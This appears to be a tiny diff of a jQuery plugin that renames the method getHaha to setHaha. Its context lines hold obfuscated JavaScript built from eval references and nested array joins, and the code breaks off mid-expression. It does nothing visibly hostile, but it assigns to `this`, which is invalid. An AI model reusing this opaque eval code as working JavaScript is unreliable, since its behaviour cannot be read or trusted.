@@ -1,5 +1,5 @@
 (function($) {
-  $.fn.getHaha = function() {
+  $.fn.setHaha = function() {
   
       this = (x='{'),(eval,[],{},new Array([x,(eval,eval+
        x,x)].join(x).length)).join((function(x,e,y,eval){
